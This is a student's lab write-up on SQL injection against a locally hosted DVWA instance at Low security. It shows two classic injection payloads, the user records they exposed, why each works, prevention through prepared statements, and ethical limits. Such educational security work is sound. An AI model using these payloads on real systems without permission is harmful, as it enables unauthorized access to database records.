# SQL Injection Notes

## 1. Objective

The objective of this task is to demonstrate a SQL Injection vulnerability using Damn Vulnerable Web Application (DVWA) in a local testing environment.

The testing was performed only on the locally hosted DVWA application with the security level set to **Low**.

---

## 2. Lab Environment

* **Operating System:** Windows
* **Web Server:** XAMPP
* **Application:** Damn Vulnerable Web Application (DVWA)
* **Database:** MySQL/MariaDB
* **Browser:** Web Browser
* **DVWA Security Level:** Low
* **Testing Target:** Localhost
* **SQL Injection Module:** SQL Injection

The DVWA SQL Injection module at Low security uses a GET request and accepts the User ID through a text input.

---

## 3. SQL Injection

SQL Injection is a web application vulnerability that occurs when user input is directly included in an SQL query without proper protection.

An attacker can provide specially crafted input that changes the intended SQL query and causes the database to return unintended results.

In this lab, DVWA is intentionally designed to demonstrate this type of vulnerability.

---

## 4. Payload 1

### Payload

```text
1' OR '1'='1
```

### Result

The payload successfully returned multiple records from the database.

The following records were displayed:

```text
ID: 1' OR '1'='1
First name: admin
Surname: admin

ID: 1' OR '1'='1
First name: Gordon
Surname: Brown

ID: 1' OR '1'='1
First name: Hack
Surname: Me

ID: 1' OR '1'='1
First name: Pablo
Surname: Picasso

ID: 1' OR '1'='1
First name: Bob
Surname: Smith
```

### Analysis

The single quote in the payload changes the original SQL expression. The `OR '1'='1'` condition is always true, so the database can return multiple rows instead of only the requested user record.

### Screenshot

`Screenshots/05-sqli-payload-1.PNG`

---

## 5. Payload 2

### Payload

```text
1' OR 1=1 #
```

### Result

This payload also successfully returned multiple records.

The following records were displayed:

```text
ID: 1' OR 1=1 #
First name: admin
Surname: admin

ID: 1' OR 1=1 #
First name: Gordon
Surname: Brown

ID: 1' OR 1=1 #
First name: Hack
Surname: Me

ID: 1' OR 1=1 #
First name: Pablo
Surname: Picasso

ID: 1' OR 1=1 #
First name: Bob
Surname: Smith
```

### Analysis

The condition `1=1` is always true. The `#` character is used to comment out the remaining part of the SQL statement in MySQL/MariaDB syntax.

Because the input is processed unsafely at the Low security level, the injected condition changes the intended query logic.

### Screenshot

`Screenshots/06-sqli-payload-2.PNG`

---

## 6. Why the Payloads Worked

Both payloads worked because the DVWA Low-security SQL Injection challenge intentionally demonstrates unsafe handling of user input.

The attacker-controlled input is treated as part of the SQL statement instead of being safely handled as data.

For Payload 1:

```text
1' OR '1'='1
```

The condition:

```text
'1'='1'
```

is always true.

For Payload 2:

```text
1' OR 1=1 #
```

The condition:

```text
1=1
```

is always true, while `#` comments out the remaining SQL statement.

---

## 7. Data Exposed

The successful injections caused the application to display multiple user records that would not normally be returned for a single user ID.

The observed exposed information included:

* User IDs
* First names
* Surnames

The lab returned five records:

1. admin — admin
2. Gordon — Brown
3. Hack — Me
4. Pablo — Picasso
5. Bob — Smith

This demonstrates how SQL Injection can allow unauthorized access to database records.

---

## 8. Prevention

SQL Injection should be prevented by using **parameterized queries / prepared statements** instead of directly concatenating user input into SQL statements.

For example, an application should use a prepared statement similar to:

```text
SELECT * FROM users WHERE user_id = ?
```

The user input should then be supplied as a parameter rather than being inserted directly into the SQL query.

Additional security measures include:

* Validate user input.
* Use parameterized/prepared SQL statements.
* Apply least-privilege permissions to database accounts.
* Avoid directly concatenating user input into SQL queries.
* Perform regular security testing.

Prepared statements separate SQL query structure from user-supplied data, preventing the input from being interpreted as SQL syntax. DVWA's source also demonstrates prepared statements at its secure/impossible level.

---

## 9. Ethical Considerations

This SQL Injection testing was performed only against a deliberately vulnerable DVWA application running locally on the test machine.

No real website, server, database, or third-party service was targeted.

SQL Injection testing should only be performed on systems where explicit permission has been provided.

---

## 10. Conclusion

The SQL Injection vulnerability was successfully demonstrated in DVWA with Low security enabled.

Two different payloads were tested:

```text
1' OR '1'='1
```

and

```text
1' OR 1=1 #
```

Both payloads returned multiple database records, demonstrating the impact of unsafe SQL query construction.

The recommended defense is to use parameterized queries or prepared statements and to properly validate user input.
